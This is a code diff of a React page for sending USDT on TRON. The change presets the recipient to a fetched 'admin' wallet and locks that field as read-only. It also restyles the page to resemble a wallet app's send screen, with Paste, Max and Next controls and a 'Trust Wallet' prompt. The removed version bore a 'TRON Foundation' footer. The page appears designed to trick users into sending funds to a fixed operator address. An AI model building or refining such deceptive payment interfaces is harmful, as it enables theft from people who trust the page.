@@ -34,6 +34,7 @@ export default function SendTronUSDT() {
   const [manualAddress, setManualAddress] = useState("");
   const [walletConnected, setWalletConnected] = useState(false);
   const [connectionMethod, setConnectionMethod] = useState(""); // "tronlink", "manual", etc.
+  const [showManualInput, setShowManualInput] = useState(false);
 
   // Fetch admin wallet on component mount
   useEffect(() => {
@@ -41,6 +42,7 @@ export default function SendTronUSDT() {
       try {
         const response = await axios.get('/api/admin/tronWallet');
         setAdminWallet(response.data.walletAddress);
+        setRecipient(response.data.walletAddress);
       } catch (error) {
         console.error("Failed to fetch admin wallet address:", error);
       }
@@ -121,7 +123,8 @@ export default function SendTronUSDT() {
       } 
       else {
         // No wallet method available
-        throw new Error("Please enter a valid TRON address or connect TronLink");
+        setShowManualInput(true);
+        throw new Error("TronLink wallet is not installed. Please use Trust Wallet option.");
       }
     } catch (error) {
       console.error("Wallet connection error:", error);
@@ -351,167 +354,148 @@ export default function SendTronUSDT() {
   const isValidRecipient = recipient && validateTronAddress(recipient);
   
   return (
-    <div className="min-h-screen bg-[#1b1b1b] text-gray-300 p-4">
-      <div className="max-w-md mx-auto mt-10">
-        <div className="mb-10 flex justify-center">
-          <img src="/logo.png" alt="TRON Logo" className="h-14" />
-        </div>
-        
-        <div className="bg-gray-900 rounded-xl p-6 border border-gray-800">
-          <h1 className="text-2xl font-medium text-center text-white mb-8">
-            Transfer USDT on TRON
-          </h1>
+    <div className="min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto">
+      <header className="flex w-full items-center mb-8">
+        <h1 className="flex-1 text-center text-xl font-medium text-white">
+          Send USDT (TRC-20)
+        </h1>
+      </header>
 
-          {/* Wallet Connection Section */}
-          <div className="mb-6">
-            <h2 className="text-lg font-medium text-white mb-4">Connect Wallet</h2>
-            
-            {/* TronLink Connection Option */}
+      <div className="space-y-6">
+        {showManualInput && (
+          <div className="space-y-1 bg-gray-800 p-3 rounded-md border border-gray-700">
+            <label className="text-sm text-gray-400">Trust Wallet Address</label>
+            <input
+              type="text"
+              placeholder="Enter your TRON wallet address (starts with T)"
+              value={manualAddress}
+              onChange={(e) => setManualAddress(e.target.value)}
+              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-2 text-base text-gray-300"
+            />
             <button
-              onClick={async () => {
-                try {
-                  if (!window.tronWeb) {
-                    alert("TronLink wallet is not installed. Please install it or use the manual option below.");
-                    return;
-                  }
-                  
-                  // Request account access
-                  if (!window.tronWeb.ready) {
-                    await window.tronLink?.request({ method: 'tron_requestAccounts' });
-                  }
-                  
-                  // Wait for TronWeb to be ready
-                  if (!window.tronWeb.ready) {
-                    throw new Error("Please unlock or connect your TronLink wallet");
-                  }
-                  
-                  const tronWeb = window.tronWeb;
-                  const address = tronWeb.defaultAddress.base58;
-                  
-                  if (!address) {
-                    throw new Error("Please unlock your TronLink wallet");
-                  }
-                  
-                  setUserAddress(address);
-                  setWalletConnected(true);
-                  setConnectionMethod("tronlink");
-                } catch (error) {
-                  alert("Failed to connect TronLink: " + error.message);
+              onClick={() => {
+                if (!manualAddress) {
+                  alert("Please enter your TRON wallet address");
+                  return;
                 }
+                
+                if (!validateTronAddress(manualAddress)) {
+                  alert("Invalid TRON address format. Address should start with 'T' and be 34 characters long.");
+                  return;
+                }
+                
+                setUserAddress(manualAddress);
+                setWalletConnected(true);
+                setConnectionMethod("manual");
+                setShowManualInput(false);
               }}
-              className={`w-full rounded-md text-sm font-medium h-10 px-4 py-2 mb-4 ${
-                connectionMethod === "tronlink" 
-                  ? "bg-green-500 text-black" 
-                  : "border border-green-500 text-green-500 hover:bg-green-500 hover:text-black"
-              } transition-colors`}
-              disabled={loading || connectionMethod === "tronlink"}
+              className="mt-2 w-full rounded-md bg-greentext text-black text-sm font-medium h-9 px-4 py-2 hover:bg-emerald-400 transition-colors"
             >
-              {connectionMethod === "tronlink" ? "TronLink Connected" : "Connect TronLink"}
+              Use Trust Wallet
             </button>
-            
-            {/* Manual/Trust Wallet Connection Option */}
-            <div className="mb-4">
-              <label className="block text-sm font-medium text-gray-400 mb-1">
-                Or Enter Your TRON Address Manually (for Trust Wallet)
-              </label>
-              <input
-                type="text"
-                placeholder="Enter your TRON wallet address (starts with T)"
-                value={manualAddress}
-                onChange={(e) => setManualAddress(e.target.value)}
-                className={`w-full rounded-md bg-gray-800 text-white border ${
-                  connectionMethod === "manual" ? "border-green-500" : "border-gray-700"
-                } p-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500`}
-                disabled={loading || connectionMethod === "tronlink"}
-              />
+          </div>
+        )}
+        
+        <div className="space-y-1">
+          <label className="text-sm text">Address or Domain Name</label>
+          <div className="relative">
+            <input
+              placeholder="Search or Enter"
+              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-32"
+              value={recipient}
+              onChange={(e) => setRecipient(e.target.value)}
+              readOnly
+            />
+            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
               <button
-                onClick={() => {
-                  if (!manualAddress) {
-                    alert("Please enter your TRON wallet address");
-                    return;
-                  }
-                  
-                  if (!validateTronAddress(manualAddress)) {
-                    alert("Invalid TRON address format. Address should start with 'T' and be 34 characters long.");
-                    return;
-                  }
-                  
-                  setUserAddress(manualAddress);
-                  setWalletConnected(true);
-                  setConnectionMethod("manual");
-                }}
-                className={`mt-2 w-full rounded-md text-sm font-medium h-10 px-4 py-2 ${
-                  connectionMethod === "manual" 
-                    ? "bg-green-500 text-black" 
-                    : "border border-green-500 text-green-500 hover:bg-green-500 hover:text-black"
-                } transition-colors`}
-                disabled={loading || connectionMethod === "manual" || !manualAddress}
+                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 px-2 text-md hover:text-emerald-400"
               >
-                {connectionMethod === "manual" ? "Address Connected" : "Use This Address"}
+                Paste
+              </button>
+              <button
+                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  className="h-4 w-4"
+                >
+                  <path d="M4 22h14a2 2 0 0 0 2-2V7.5L14.5 2H6a2 2 0 0 0-2 2v4"></path>
+                  <polyline points="14 2 14 8 20 8"></polyline>
+                  <path d="M2 15h10"></path>
+                  <path d="m9 18 3-3-3-3"></path>
+                </svg>
+              </button>
+              <button
+                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  className="h-4 w-4"
+                >
+                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                  <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg>
               </button>
             </div>
-            
-            {walletConnected && (
-              <div className="text-sm text-gray-400 mt-2">
-                Connected Address: {userAddress.substring(0, 8)}...{userAddress.substring(userAddress.length - 6)}
-              </div>
-            )}
-          </div>
-          
-          {/* Transaction Section - Only show when wallet is connected */}
-          {walletConnected && (
-            <>
-              <div className="mb-6">
-                <label className="block text-sm font-medium text-gray-400 mb-1">
-                  Amount (USDT)
-                </label>
-                <input
-                  type="number"
-                  placeholder="Enter amount"
-                  value={amount}
-                  onChange={(e) => setAmount(e.target.value)}
-                  className="w-full rounded-md bg-gray-800 text-white border border-gray-700 p-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
-                  disabled={loading}
-                />
-                <p className="text-xs text-gray-500 mt-1">
-                  Minimum amount: 100 USDT
-                </p>
-              </div>
-              
-              <button
-                onClick={handleSubmit}
-                disabled={loading || !isValidAmount || !walletConnected}
-                className="w-full rounded-md bg-green-500 text-black text-sm font-medium h-12 px-4 py-2 hover:bg-green-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
-              >
-                {loading ? (
-                  <span className="flex items-center justify-center">
-                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    Processing...
-                  </span>
-                ) : (
-                  "Transfer USDT"
-                )}
-              </button>
-            </>
-          )}
-          
-          <div className="mt-6 text-center">
-            <a
-              href="/transactions"
-              className="text-sm text-gray-400 hover:text-white"
-            >
-              View Transaction History
-            </a>
           </div>
         </div>
         
-        <div className="mt-8 text-center text-xs text-gray-500">
-          <p>TRON Network: Secure, High-throughput, Scalable</p>
-          <p className="mt-2">© {new Date().getFullYear()} TRON Foundation</p>
+        <div className="space-y-1">
+          <label className="text-sm text-gray-400">Amount</label>
+          <div className="relative">
+            <input
+              placeholder="USDT Amount"
+              type="number"
+              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-24"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+            />
+            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+              <span className="text-gray-500 text-sm mr-2">USDT</span>
+              <button
+                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 text-sm hover:text-emerald-400"
+              >
+                Max
+              </button>
+            </div>
+          </div>
         </div>
+        
+        <div className="text-xs text-gray-500">
+          ≈ ${Number.parseFloat(amount || "0").toFixed(2)}
+        </div>
+      </div>
+
+      <div className="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
+        <button
+          className="w-full bg-greentext text-black hover:bg-gray-700 rounded-full disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-600 disabled:text-white h-12 text-lg inline-flex items-center justify-center gap-2"
+          disabled={!isValidAmount || loading}
+          onClick={handleSubmit}
+        >
+          {loading ? (
+            <div className="flex items-center justify-center">
+              <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></div>
+            </div>
+          ) : (
+            "Next"
+          )}
+        </button>
       </div>
     </div>
   );
